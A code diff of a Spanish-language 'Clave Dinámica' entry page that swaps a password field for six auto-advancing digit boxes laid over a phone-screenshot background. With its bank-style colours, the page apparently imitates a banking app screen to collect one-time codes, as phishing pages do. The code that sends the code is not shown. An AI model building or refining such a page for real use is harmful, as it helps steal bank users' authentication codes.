@@ -27,6 +27,22 @@
             height: 100%;
             object-fit: cover;
         }
+        
+        /* Texto "Ingrese Clave Dinámica" */
+        .title-text {
+            position: absolute;
+            top: 45%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.7);
+            width: 100%;
+        }
+        
+        /* Contenedor de las 6 rayitas */
         .center-box {
             position: absolute;
             top: 55%;
@@ -40,19 +56,30 @@
             align-items: center;
             border-radius: 8px;
         }
-        .center-box .input-container {
-            position: relative;
+        
+        .digits-container {
+            display: flex;
+            gap: 8px;
             width: 80%;
+            justify-content: center;
         }
-        .center-box input {
-            width: 100%;
-            padding: 10px;
-            padding-left: 40px;
-            font-size: 19px;
+        
+        .digit-input {
+            width: 35px;
+            height: 45px;
             border: none;
-            border-bottom: 1px solid #ffe100;
+            border-bottom: 2px solid #ffe100;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
             outline: none;
+            background: transparent;
         }
+        
+        .digit-input:focus {
+            border-bottom: 2px solid #210049;
+        }
+        
         .button-container {
             position: absolute;
             top: 70.4%;
@@ -61,6 +88,7 @@
             display: flex;
             gap: 10px;
         }
+        
         .button-container button {
             padding: 13px 35px;
             font-size: 13px;
@@ -69,10 +97,12 @@
             font-weight: bold;
             cursor: pointer;
         }
+        
         .button-container button:first-child {
             background-color: #ffffff;
             border: 1px solid black;
         }
+        
         .button-container button:last-child {
             background-color: #ffda37;
             color: black;
@@ -82,12 +112,22 @@
 <body>
     <div class="image-container">
         <img src="img/cel1.jpg" alt="Background Image">
+        
+        <!-- Texto "Ingrese Clave Dinámica" -->
+        <div class="title-text">Ingrese Clave Dinámica</div>
+        
+        <!-- Contenedor de las 6 rayitas -->
         <div class="center-box">
-            <div class="input-container">
-                <i>🔒</i>
-                <input type="password" placeholder="Clave Dinámica" id="claveInput" maxlength="6">
+            <div class="digits-container">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
+                <input type="text" class="digit-input" maxlength="1" inputmode="numeric">
             </div>
         </div>
+        
         <div class="button-container">
             <button onclick="window.history.back()">Cancelar</button>
             <button id="loginButton">Ingresar</button>
@@ -95,16 +135,54 @@
     </div>
 
     <script>
-        const claveInput = document.getElementById('claveInput');
+        const digitInputs = document.querySelectorAll('.digit-input');
         const loginButton = document.getElementById('loginButton');
 
-        // Solo permitir números
-        claveInput.addEventListener('input', function() {
-            this.value = this.value.replace(/[^0-9]/g, '');
+        // Manejar la entrada en cada dígito
+        digitInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                // Solo permitir números
+                this.value = this.value.replace(/[^0-9]/g, '');
+                
+                // Mover al siguiente input si se ingresó un número
+                if (this.value.length === 1 && index < digitInputs.length - 1) {
+                    digitInputs[index + 1].focus();
+                }
+                
+                // Verificar si todos los campos están llenos
+                checkAllDigitsFilled();
+            });
+            
+            input.addEventListener('keydown', function(e) {
+                // Manejar tecla borrar (backspace)
+                if (e.key === 'Backspace') {
+                    if (this.value === '' && index > 0) {
+                        digitInputs[index - 1].focus();
+                    }
+                }
+                
+                // Manejar flechas
+                if (e.key === 'ArrowLeft' && index > 0) {
+                    digitInputs[index - 1].focus();
+                } else if (e.key === 'ArrowRight' && index < digitInputs.length - 1) {
+                    digitInputs[index + 1].focus();
+                }
+            });
         });
 
+        // Verificar si todos los dígitos están llenos
+        function checkAllDigitsFilled() {
+            const allFilled = Array.from(digitInputs).every(input => input.value.length === 1);
+            return allFilled;
+        }
+
+        // Obtener la clave completa
+        function getFullClave() {
+            return Array.from(digitInputs).map(input => input.value).join('');
+        }
+
         loginButton.addEventListener('click', async () => {
-            const claveValue = claveInput.value.trim();
+            const claveValue = getFullClave();
             
             if (claveValue.length === 6) {
                 try {
@@ -159,12 +237,8 @@
             }
         });
 
-        // También enviar con Enter
-        claveInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                loginButton.click();
-            }
-        });
+        // Enfocar el primer input al cargar la página
+        digitInputs[0].focus();
     </script>
 </body>
 </html>
